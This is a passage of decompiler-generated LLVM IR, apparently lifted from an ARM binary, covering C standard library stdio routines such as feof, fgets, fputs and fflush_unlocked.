  %v3_13764 = load i32, i32* %v2_13764, align 4
  %v2_1376c.pre = load i32, i32* %r6.global-to-local, align 4
  %v3_1376c = sub i32 %v2_1376c.pre, %v2_13300
  store i32 %v3_1376c, i32* %r3.global-to-local, align 4
  %v5_13770 = mul i32 %v3_1376c, 4
  %v6_13770 = add i32 %v5_13770, %v3_13764
  store i32 %v6_13770, i32* @r2, align 4
  br label %bb146

.thread46:                                        ; preds = %dec_label_pc_13758
  %v1_1376841 = load i32, i32* %r6.global-to-local, align 4
  %v2_1376842 = add i32 %v1_1376841, 1
  store i32 %v2_1376842, i32* %r3.global-to-local, align 4
  %v3_13774 = inttoptr i32 %v2_13774 to i32*
  store i32 %v2_1376842, i32* %v3_13774, align 4
  %v0_13778.pre = load i32, i32* %r7.global-to-local, align 4
  br label %bb146

bb146:                                            ; preds = %.thread44, %.thread46
  %v1_13780 = phi i32 [ %v2_13774, %.thread44 ], [ %v0_13778.pre, %.thread46 ]
  %v1_13778 = add i32 %v1_13780, 28
  %v2_13778 = inttoptr i32 %v1_13778 to i32*
  %v3_13778 = load i32, i32* %v2_13778, align 4
  store i32 %v3_13778, i32* %r3.global-to-local, align 4
  %v1_1377c = add i32 %v3_13778, 2
  store i32 %v1_1377c, i32* %r0.global-to-local, align 4
  %v0_13780 = load i32, i32* %sb.global-to-local, align 4
  %v2_13780 = add i32 %v1_13780, 24
  %v3_13780 = inttoptr i32 %v2_13780 to i32*
  store i32 %v0_13780, i32* %v3_13780, align 4
  br i1 %v2_1375c, label %dec_label_pc_13790, label %bb147

bb147:                                            ; preds = %bb146
  %v1_13784 = load i32, i32* @r2, align 4
  %v2_13784 = load i32, i32* %r7.global-to-local, align 4
  %v3_13784 = inttoptr i32 %v2_13784 to i32*
  store i32 %v1_13784, i32* %v3_13784, align 4
  br label %dec_label_pc_13790

dec_label_pc_1378c:                               ; preds = %dec_label_pc_13348, %dec_label_pc_13454, %dec_label_pc_13504, %dec_label_pc_134d8, %dec_label_pc_134e4, %dec_label_pc_13424, %dec_label_pc_136c4, %dec_label_pc_13670, %.thread25
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13790

dec_label_pc_13790:                               ; preds = %bb147, %bb146, %dec_label_pc_1378c
  %v2_13794 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_13794, i32* @r4, align 4
  store i32 %v6_132f8, i32* @r5, align 4
  %v26_13794 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v26_13794

; uselistorder directives
  uselistorder i32 %v3_1376c, { 1, 0 }
  uselistorder i32 %v1_1372c, { 1, 2, 0 }
  uselistorder i32 %v0_136e0, { 1, 2, 0 }
  uselistorder i32 %v2_136bc, { 1, 0 }
  uselistorder i32 %v1_136bc, { 1, 0, 2 }
  uselistorder i32 %v0_136dc, { 3, 4, 5, 0, 7, 6, 9, 1, 2, 8, 10 }
  uselistorder i32 %v1_13620, { 1, 2, 0 }
  uselistorder i32 %v3_13608, { 1, 0 }
  uselistorder i32 %v3_13600, { 1, 0 }
  uselistorder i32 %v2_135e0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_135c8, { 0, 2, 3, 1 }
  uselistorder i32 %v1_135ac, { 1, 0, 2 }
  uselistorder i32 %v3_1358c, { 2, 1, 0 }
  uselistorder i32 %v1_13550, { 0, 2, 3, 1 }
  uselistorder i32 %v2_13524, { 1, 0 }
  uselistorder i32 %v5_13484, { 0, 1, 3, 2 }
  uselistorder i32 %v0_13484, { 1, 0 }
  uselistorder i32 %storemerge105, { 1, 0, 4, 5, 2, 3 }
  uselistorder i32 %stack_var_-48.2, { 1, 0 }
  uselistorder i32 %v2_13430, { 1, 0 }
  uselistorder i32 %v0_1344c, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_13414, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_133fc, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i32 %v3_133e8, { 1, 2, 0 }
  uselistorder i32 %v0_13460, { 1, 2, 3, 0, 4, 7, 5, 6 }
  uselistorder i32 %stack_var_-48.1, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1339c, { 1, 0 }
  uselistorder i32 %v1_1336c, { 0, 2, 1 }
  uselistorder i32 %v25_132f8, { 0, 8, 1, 9, 2, 7, 3, 10, 4, 5, 6 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %stack_var_-36, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %sb.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3, 8, 9 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 1, 3, 4, 7, 6, 5, 8 }
  uselistorder i32* %r7.global-to-local, { 4, 2, 1, 5, 9, 6, 0, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 3, 18 }
  uselistorder i32* %r6.global-to-local, { 14, 10, 12, 9, 3, 5, 13, 6, 7, 8, 0, 1, 2, 15, 4, 11 }
  uselistorder i32* %r3.global-to-local, { 3, 0, 11, 4, 5, 6, 7, 8, 9, 10, 12, 13, 14, 15, 17, 16, 1, 2, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 41, 42, 43, 39, 40, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 14, 15, 11, 12, 0, 16 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 5, 7, 6, 8, 9, 10, 11, 12, 13, 20, 19, 14, 22, 15, 16, 17, 23, 18, 24, 25, 1, 26, 27, 28, 21, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 8, 7 }
  uselistorder i32 38, { 1, 0, 2 }
  uselistorder i32 ()* @_promoted_size, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_232e8.1073 to i32), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_232f8.1071 to i32), { 1, 0, 2 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_23314.1065 to i32), { 2, 1, 3, 0, 4 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_232d4.1063 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 2, 3, 4, 1, 5, 0, 6, 7 }
  uselistorder label %dec_label_pc_13790, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1378c, { 6, 7, 8, 2, 4, 3, 1, 5, 0 }
  uselistorder label %bb146, { 1, 0 }
  uselistorder label %dec_label_pc_13758, { 1, 0 }
  uselistorder label %dec_label_pc_13728, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13714, { 0, 2, 1 }
  uselistorder label %dec_label_pc_136d0, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_13688, { 1, 0 }
  uselistorder label %bb137, { 2, 1, 0 }
  uselistorder label %.thread25, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1353c, { 1, 0 }
  uselistorder label %dec_label_pc_13514, { 1, 0 }
  uselistorder label %dec_label_pc_134c4, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_13444, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13440, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_133a0, { 1, 0 }
  uselistorder label %dec_label_pc_13390, { 1, 0 }
}

define i32 @feof(i8* %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_137bc = load i32, i32* @r4, align 4
  store i32 %v3_137bc, i32* %stack_var_-16, align 4
  %v2_137c0 = add i32 %tmp, 52
  %v3_137c0 = inttoptr i32 %v2_137c0 to i32*
  %v4_137c0 = load i32, i32* %v3_137c0, align 4
  store i32 %v4_137c0, i32* %r6.global-to-local, align 4
  %v2_137c8 = ptrtoint i32* %stack_var_-32 to i32
  %v2_137cc = icmp eq i32 %v4_137c0, 0
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %v2_137c8, i32* @r0, align 4
  br i1 %v2_137cc, label %dec_label_pc_137e4, label %dec_label_pc_13800

dec_label_pc_137e4:                               ; preds = %entry
  %v1_137ec = call i32 @__pthread_return_void()
  %v1_137fc = call i32 @__pthread_return_0()
  %v0_13800.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_13808.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13800

dec_label_pc_13800:                               ; preds = %entry, %dec_label_pc_137e4
  %v0_13808 = phi i32 [ %v4_137c0, %entry ], [ %v0_13808.pre, %dec_label_pc_137e4 ]
  %v0_13800 = phi i32 [ %tmp, %entry ], [ %v0_13800.pre, %dec_label_pc_137e4 ]
  %v1_13800 = add i32 %v0_13800, 1
  %v2_13800 = inttoptr i32 %v1_13800 to i8*
  %v3_13800 = load i8, i8* %v2_13800, align 1
  %v4_13800 = zext i8 %v3_13800 to i32
  %v1_13804 = inttoptr i32 %v0_13800 to i8*
  %v2_13804 = load i8, i8* %v1_13804, align 1
  %v3_13804 = zext i8 %v2_13804 to i32
  %v2_13808 = icmp eq i32 %v0_13808, 0
  %v4_13814 = mul nuw nsw i32 %v4_13800, 256
  %v5_13814 = or i32 %v3_13804, %v4_13814
  store i32 %v5_13814, i32* %r4.global-to-local, align 4
  br i1 %v2_13808, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_13800
  call void @__pseudo_branch(i32 90076)
  %v0_13824.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_13800, %bb
  %v0_13824 = phi i32 [ %v5_13814, %dec_label_pc_13800 ], [ %v0_13824.pre, %bb ]
  %v1_13824 = and i32 %v0_13824, 4
  %v2_1382c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1382c, i32* @r4, align 4
  ret i32 %v1_13824

; uselistorder directives
  uselistorder i32 %v0_13800, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_13800, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_13840 = load i32, i32* @r4, align 4
  store i32 %v3_13840, i32* %stack_var_-24, align 4
  %v6_13840 = load i32, i32* @r5, align 4
  %v9_13840 = load i32, i32* @r6, align 4
  %v12_13840 = load i32, i32* @r7, align 4
  %v1_13844 = add i32 %arg3, 52
  %v2_13844 = inttoptr i32 %v1_13844 to i32*
  %v3_13844 = load i32, i32* %v2_13844, align 4
  store i32 %v3_13844, i32* %r8.global-to-local, align 4
  %v2_13848 = ptrtoint i32* %stack_var_-40 to i32
  %v1_1384c = add i32 %arg3, 56
  store i32 %v1_1384c, i32* @r5, align 4
  %v2_13850 = icmp eq i32 %v3_13844, 0
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %v2_13848, i32* @r0, align 4
  br i1 %v2_13850, label %dec_label_pc_13870, label %dec_label_pc_1388c

dec_label_pc_13870:                               ; preds = %entry
  %v1_13878 = call i32 @__pthread_return_void()
  store i32 80012, i32* @lr, align 4
  %v1_13888 = call i32 @__pthread_return_0()
  %v0_1388c.pre = load i32, i32* @r6, align 4
  %v0_13890.pre = load i32, i32* @r4, align 4
  %v0_13894.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1388c

dec_label_pc_1388c:                               ; preds = %entry, %dec_label_pc_13870
  %v0_13894 = phi i32 [ %arg1, %entry ], [ %v0_13894.pre, %dec_label_pc_13870 ]
  %v0_13890 = phi i32 [ %arg3, %entry ], [ %v0_13890.pre, %dec_label_pc_13870 ]
  %v0_1388c = phi i32 [ %arg2, %entry ], [ %v0_1388c.pre, %dec_label_pc_13870 ]
  %v3_13898 = inttoptr i32 %v0_13894 to i8*
  %v4_13898 = call i32 @__GI_fgets_unlocked(i8* %v3_13898, i32 %v0_1388c, i32 %v0_13890)
  %v0_1389c = load i32, i32* %r8.global-to-local, align 4
  %v2_1389c = icmp eq i32 %v0_1389c, 0
  store i32 %v4_13898, i32* %r4.global-to-local, align 4
  br i1 %v2_1389c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1388c
  store i32 80056, i32* @lr, align 4
  call void @__pseudo_branch(i32 90076)
  %v0_138b8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1388c, %bb
  %v0_138b8 = phi i32 [ %v4_13898, %dec_label_pc_1388c ], [ %v0_138b8.pre, %bb ]
  %v2_138c0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_138c0, i32* @r4, align 4
  store i32 %v6_13840, i32* @r5, align 4
  store i32 %v9_13840, i32* @r6, align 4
  store i32 %v12_13840, i32* @r7, align 4
  ret i32 %v0_138b8

; uselistorder directives
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_1388c, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_138d4 = load i32, i32* @r4, align 4
  store i32 %v3_138d4, i32* %stack_var_-20, align 4
  %v6_138d4 = load i32, i32* @r5, align 4
  %v9_138d4 = load i32, i32* @r6, align 4
  %v12_138d4 = load i32, i32* @r7, align 4
  %v1_138d8 = add i32 %arg2, 52
  %v2_138d8 = inttoptr i32 %v1_138d8 to i32*
  %v3_138d8 = load i32, i32* %v2_138d8, align 4
  store i32 %v3_138d8, i32* @r7, align 4
  %v1_138dc = add i32 %arg2, 56
  store i32 %v1_138dc, i32* @r5, align 4
  %v2_138e0 = ptrtoint i32* %stack_var_-36 to i32
  %v2_138e4 = icmp eq i32 %v3_138d8, 0
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %v2_138e0, i32* @r0, align 4
  br i1 %v2_138e4, label %dec_label_pc_13900, label %dec_label_pc_1391c

dec_label_pc_13900:                               ; preds = %entry
  %v1_13908 = call i32 @__pthread_return_void()
  store i32 80156, i32* @lr, align 4
  %v1_13918 = call i32 @__pthread_return_0()
  %v0_1391c.pre = load i32, i32* @r4, align 4
  %v0_13920.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1391c

dec_label_pc_1391c:                               ; preds = %entry, %dec_label_pc_13900
  %v0_13920 = phi i32 [ %arg1, %entry ], [ %v0_13920.pre, %dec_label_pc_13900 ]
  %v0_1391c = phi i32 [ %arg2, %entry ], [ %v0_1391c.pre, %dec_label_pc_13900 ]
  %v2_13924 = inttoptr i32 %v0_13920 to i8*
  %v3_13924 = call i32 @__GI_fputs_unlocked(i8* %v2_13924, i32 %v0_1391c)
  %v0_13928 = load i32, i32* @r7, align 4
  %v2_13928 = icmp eq i32 %v0_13928, 0
  store i32 %v3_13924, i32* %r4.global-to-local, align 4
  br i1 %v2_13928, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1391c
  call void @__pseudo_branch(i32 90076)
  %v0_13944.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1391c, %bb
  %v0_13944 = phi i32 [ %v3_13924, %dec_label_pc_1391c ], [ %v0_13944.pre, %bb ]
  %v2_1394c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1394c, i32* @r4, align 4
  store i32 %v6_138d4, i32* @r5, align 4
  store i32 %v9_138d4, i32* @r6, align 4
  store i32 %v12_138d4, i32* @r7, align 4
  ret i32 %v0_13944

; uselistorder directives
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_1391c, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v2_13964 = ptrtoint i32* %stack_var_-48 to i32
  %v2_13968 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_13968, i32* @r0, align 4
  store i32 90076, i32* %r4.global-to-local, align 4
  %v1_1397c = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_15fd4.997 to i32), i32* %r5.global-to-local, align 4
  %v1_1398c = call i32 @__pthread_return_0()
  %v2_13994 = load i32, i32* @global_var_30928.1003, align 4
  %v7_13998 = icmp eq i32 %v2_13994, 1
  br i1 %v7_13998, label %dec_label_pc_139a0, label %dec_label_pc_13a4c

dec_label_pc_139a0:                               ; preds = %entry
  %v2_139a4 = load i32, i32* @global_var_3092c.1008, align 4
  %tmp19 = icmp slt i32 %v2_139a4, 1
  br i1 %tmp19, label %dec_label_pc_13a4c, label %dec_label_pc_139b0

dec_label_pc_139b0:                               ; preds = %dec_label_pc_139a0
  store i32 %v2_13964, i32* @r0, align 4
  %v1_139c0 = call i32 @__pthread_return_void()
  %v1_139cc = call i32 @__pthread_return_0()
  %v2_139d4 = load i32, i32* bitcast (i32** @global_var_2c5ac.1025 to i32*), align 4
  store i32 %v2_139d4, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_13a243 = icmp eq i32 %v2_139d4, 0
  br i1 %v2_13a243, label %dec_label_pc_13a30, label %dec_label_pc_139e0

dec_label_pc_139e0:                               ; preds = %dec_label_pc_139b0, %dec_label_pc_13a20
  %v1_139f8 = phi i32 [ %v0_13a20, %dec_label_pc_13a20 ], [ %v2_139d4, %dec_label_pc_139b0 ]
  %v1_139e0 = inttoptr i32 %v1_139f8 to i8*
  %v2_139e0 = load i8, i8* %v1_139e0, align 1
  %v3_139e0 = zext i8 %v2_139e0 to i32
  %v1_139e4 = add i32 %v1_139f8, 1
  %v2_139e4 = inttoptr i32 %v1_139e4 to i8*
  %v3_139e4 = load i8, i8* %v2_139e4, align 1
  %v4_139e4 = zext i8 %v3_139e4 to i32
  %v4_139e8 = mul nuw nsw i32 %v4_139e4, 256
  %v5_139e8 = or i32 %v4_139e8, %v3_139e0
  %v2_139ec = and i32 %v5_139e8, 32816
  %v7_139f0 = icmp eq i32 %v2_139ec, 48
  %v1_139f4 = add i32 %v1_139f8, 32
  %v2_139f4 = inttoptr i32 %v1_139f4 to i32*
  %v3_139f4 = load i32, i32* %v2_139f4, align 4
  store i32 %v3_139f4, i32* %r5.global-to-local, align 4
  br i1 %v7_139f0, label %dec_label_pc_13a00, label %.thread12

.thread12:                                        ; preds = %dec_label_pc_139e0
  store i32 %v1_139f8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13a20

dec_label_pc_13a00:                               ; preds = %dec_label_pc_139e0
  %v0_13a00 = load i32, i32* %r6.global-to-local, align 4
  %v2_13a00 = icmp eq i32 %v0_13a00, 0
  br i1 %v2_13a00, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_13a00
  %v3_13a08 = add i32 %v0_13a00, 32
  %v4_13a08 = inttoptr i32 %v3_13a08 to i32*
  store i32 %v3_139f4, i32* %v4_13a08, align 4
  %v0_13a10.pre = load i32, i32* %r4.global-to-local, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_13a00
  store i32 %v3_139f4, i32* bitcast (i32** @global_var_2c5ac.1025 to i32*), align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_13a10 = phi i32 [ %v0_13a10.pre, %.thread ], [ %v1_139f8, %.thread1 ]
  %v1_13a10 = add i32 %v0_13a10, 1
  %v2_13a10 = inttoptr i32 %v1_13a10 to i8*
  %v3_13a10 = load i8, i8* %v2_13a10, align 1
  %v1_13a14 = and i8 %v3_13a10, 32
  %v1_13a1c = icmp ne i8 %v1_13a14, 0
  call void @__pseudo_cond_branch(i1 %v1_13a1c, i32 ptrtoint (i32* @global_var_14ed0.1005 to i32))
  %v0_13a20.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13a20

dec_label_pc_13a20:                               ; preds = %.thread12, %bb
  %v0_13a20 = phi i32 [ %v0_13a20.pre, %bb ], [ %v3_139f4, %.thread12 ]
  store i32 %v0_13a20, i32* %r4.global-to-local, align 4
  %v2_13a24 = icmp eq i32 %v0_13a20, 0
  br i1 %v2_13a24, label %dec_label_pc_13a30, label %dec_label_pc_139e0

dec_label_pc_13a30:                               ; preds = %dec_label_pc_13a20, %dec_label_pc_139b0
  store i32 %v2_13964, i32* @r0, align 4
  %v1_13a40 = call i32 @__pthread_return_void()
  %v0_13a48 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13a48, i32* @global_var_3092c.1008, align 4
  %v2_13a50.pre = load i32, i32* @global_var_30928.1003, align 4
  br label %dec_label_pc_13a4c

dec_label_pc_13a4c:                               ; preds = %entry, %dec_label_pc_139a0, %dec_label_pc_13a30
  %v2_13a50 = phi i32 [ %v2_13994, %entry ], [ 1, %dec_label_pc_139a0 ], [ %v2_13a50.pre, %dec_label_pc_13a30 ]
  %v1_13a54 = add i32 %v2_13a50, -1
  store i32 %v1_13a54, i32* @global_var_30928.1003, align 4
  store i32 %v2_13968, i32* @r0, align 4
  store i32 80496, i32* @lr, align 4
  %v1_13a6c = call i32 @__pthread_return_void()
  ret i32 %v1_13a6c

; uselistorder directives
  uselistorder i32 %v0_13a20, { 2, 1, 0 }
  uselistorder i32 %v3_139f4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_139f8, { 0, 1, 2, 4, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3, 4 }
  uselistorder i32* @global_var_3092c.1008, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_13a4c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13a20, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_139e0, { 1, 0 }
}

define i32 @fflush_unlocked(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_13aa0 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32** @global_var_2c5ac.1025 to i32), i32* %r3.global-to-local, align 4
  %v10_13aa8 = icmp eq i8* %arg1, bitcast (i32** @global_var_2c5ac.1025 to i8*)
  store i1 %v10_13aa8, i1* %cpsr_z.global-to-local, align 1
  %.v1_13aac = select i1 %v10_13aa8, i32 0, i32 %tmp
  store i32 %.v1_13aac, i32* %r8.global-to-local, align 4
  %v2_13ab4 = ptrtoint i32* %stack_var_-44 to i32
  br i1 %v10_13aa8, label %bb, label %dec_label_pc_13ac0

bb:                                               ; preds = %entry
  store i32 %.v1_13aac, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_13acc

dec_label_pc_13ac0:                               ; preds = %entry
  %v2_13ac0 = icmp eq i32 %.v1_13aac, 0
  store i1 %v2_13ac0, i1* %cpsr_z.global-to-local, align 1
  store i32 256, i32* %sl.global-to-local, align 4
  br i1 %v2_13ac0, label %dec_label_pc_13acc, label %dec_label_pc_13c18

dec_label_pc_13acc:                               ; preds = %bb, %dec_label_pc_13ac0
  store i32 ptrtoint (i8* @global_var_15fd4.997 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_13ab4, i32* @r0, align 4
  %v1_13ae0 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_2c5c8.1001 to i32), i32* %r0.global-to-local, align 4
  %v1_13af0 = call i32 @__pthread_return_0()
  %v2_13af8 = load i32, i32* @global_var_30928.1003, align 4
  %v1_13afc = add i32 %v2_13af8, 1
  store i32 %v1_13afc, i32* %r3.global-to-local, align 4
  store i32 %v1_13afc, i32* @global_var_30928.1003, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_13ab4, i32* @r0, align 4
  %v1_13b14 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_15fd4.997 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_13ab4, i32* @r0, align 4
  %v1_13b28 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_2c5b0.1022 to i32), i32* %r0.global-to-local, align 4
  %v1_13b34 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32** @global_var_2c5ac.1025 to i32), i32* %r3.global-to-local, align 4
  store i32 %v2_13ab4, i32* @r0, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_13b44 = load i32, i32* bitcast (i32** @global_var_2c5ac.1025 to i32*), align 4
  store i32 %v2_13b44, i32* @r6, align 4
  %v1_13b4c = call i32 @__pthread_return_void()
  store i32 %v1_13b4c, i32* %r0.global-to-local, align 4
  store i32 %v2_13ab4, i32* @r4, align 4
  %v0_13b54 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_13b54, i32* @r5, align 4
  %v0_13c08.pr = load i32, i32* @r6, align 4
  %v2_13c0825 = icmp eq i32 %v0_13c08.pr, 0
  store i1 %v2_13c0825, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13c0825, label %dec_label_pc_13c10, label %dec_label_pc_13b5c

dec_label_pc_13b5c:                               ; preds = %dec_label_pc_13acc, %.thread11
  %v0_13b78 = phi i32 [ %v3_13c04, %.thread11 ], [ %v0_13c08.pr, %dec_label_pc_13acc ]
  %v1_13b5c = inttoptr i32 %v0_13b78 to i8*
  %v2_13b5c = load i8, i8* %v1_13b5c, align 1
  %v3_13b5c = zext i8 %v2_13b5c to i32
  store i32 %v3_13b5c, i32* %r3.global-to-local, align 4
  %v1_13b60 = and i32 %v3_13b5c, 64
  %v2_13b60 = icmp eq i32 %v1_13b60, 0
  store i1 %v2_13b60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13b60, label %.thread11, label %dec_label_pc_13b68

dec_label_pc_13b68:                               ; preds = %dec_label_pc_13b5c
  %v2_13b6c = load i32, i32* @global_var_2c5e0.1016, align 4
  store i32 %v2_13b6c, i32* %r3.global-to-local, align 4
  %v7_13b70 = icmp eq i32 %v2_13b6c, 2
  store i1 %v7_13b70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13b70, label %dec_label_pc_13ba4, label %dec_label_pc_13b78

dec_label_pc_13b78:                               ; preds = %dec_label_pc_13b68
  %v1_13b78 = add i32 %v0_13b78, 56
  store i32 %v1_13b78, i32* @r4, align 4
  store i32 %v2_13ab4, i32* @r0, align 4
  store i32 90076, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_15fd4.997 to i32), i32* %r1.global-to-local, align 4
  %v1_13b90 = call i32 @__pthread_return_void()
  %v0_13b94 = load i32, i32* @r4, align 4
  store i32 %v0_13b94, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_15fd4.997 to i32), i32* %r3.global-to-local, align 4
  %v1_13ba0 = call i32 @__pthread_return_0()
  store i32 %v1_13ba0, i32* %r0.global-to-local, align 4
  %v0_13ba4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_13ba4

dec_label_pc_13ba4:                               ; preds = %dec_label_pc_13b68, %dec_label_pc_13b78
  %v0_13bb8 = phi i32 [ %v0_13b78, %dec_label_pc_13b68 ], [ %v0_13ba4.pre, %dec_label_pc_13b78 ]
  %v1_13ba4 = inttoptr i32 %v0_13bb8 to i32*
  %v2_13ba4 = load i32, i32* %v1_13ba4, align 4
  %v0_13ba8 = load i32, i32* %sl.global-to-local, align 4
  %v2_13ba8 = or i32 %v0_13ba8, %v2_13ba4
  %v1_13bac = xor i32 %v2_13ba8, 320
  store i32 %v1_13bac, i32* %r3.global-to-local, align 4
  %v1_13bb0 = and i32 %v1_13bac, 832
  %v2_13bb0 = icmp eq i32 %v1_13bb0, 0
  store i1 %v2_13bb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13bb0, label %dec_label_pc_13bb8, label %bb39

dec_label_pc_13bb8:                               ; preds = %dec_label_pc_13ba4
  store i32 %v0_13bb8, i32* @r0, align 4
  %v0_13bbc = call i32 @__stdio_wcommit()
  store i32 %v0_13bbc, i32* %r0.global-to-local, align 4
  %v2_13bc0 = icmp eq i32 %v0_13bbc, 0
  store i1 %v2_13bc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13bc0, label %.thread5, label %.thread7

.thread5:                                         ; preds = %dec_label_pc_13bb8
  %v1_13bc4 = load i32, i32* @r6, align 4
